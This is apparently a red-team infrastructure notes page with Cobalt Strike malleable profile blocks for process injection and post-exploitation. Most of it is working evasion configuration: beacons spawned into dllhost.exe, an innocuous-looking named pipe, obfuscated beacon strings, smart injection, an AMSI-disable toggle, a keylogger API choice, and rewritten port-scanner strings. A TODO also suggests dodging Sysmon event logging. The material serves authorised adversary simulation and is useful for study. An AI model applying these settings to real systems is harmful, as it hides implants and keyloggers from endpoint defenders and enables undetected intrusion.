---
author(s):
  - Userware
tags:
  - helpers
  - red-team-infrastructure
  - cobalt-strike
---
# 05 - Post Exploitation Code Block

## 5.1 - Process Inject Block

TODO: Change the CreateRemoteThread to something else for bypassing sysmon event ID

```
process-inject {
	set userwx "false";
	
	set startrwx "true";
}
```

## 5.2 - Post Exploitation Block (Evasion)

```
post-ex {
    set pipename "Winsock2\\CatalogChangeListener-###-0";
	# Spawn the beacons to default windows EXE binaries.
	set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
	set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";

	# Obfuscate beacon strings
	set obfuscate "true";

	set smartinject "true";
	
	# Disable AMSI feature. To enable it set it to "false"
    set amsi_disable "false";

	# Set a specific windows function for recording keystrokes (select only one of them)
	# set keylogger "SetWindowsHookEx";
	set keylogger "GetAsyncKeyState";

	# When replacing the strings. Ensure the messages are meaningful when displayed for the operator.
    transform-x64 { 
        strrepex "PortScanner" "Scanner module is complete" "";
        strrepex "PortScanner" "(ICMP) Target" "pmci trg=";
        strrepex "PortScanner" "is alive." "is up.";
        strrepex "PortScanner" "(ARP) Target" "rpa trg=";
        #...
        #...
        #...
    } 

    transform-x86 { 
        # replace a string in the port scanner dll 
        strrepex "PortScanner" "Scanner module is complete" "Scan is complete"; 

        # replace a string in all post exploitation dlls 
        strrep "is alive." "is up."; 
    }
}
```

---
## References

### WhiteKnightLabs

- [WhiteKnightLabs: Unleashing the Unseen: Harnessing the Power of Cobalt Strike Profiles for EDR Evasion](https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/)

- [WhiteKnightLabs: Harnessing the Power of Cobalt Strike Profiles for EDR Evasion - Part 2](https://whiteknightlabs.com/2025/05/19/harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion-part-2/)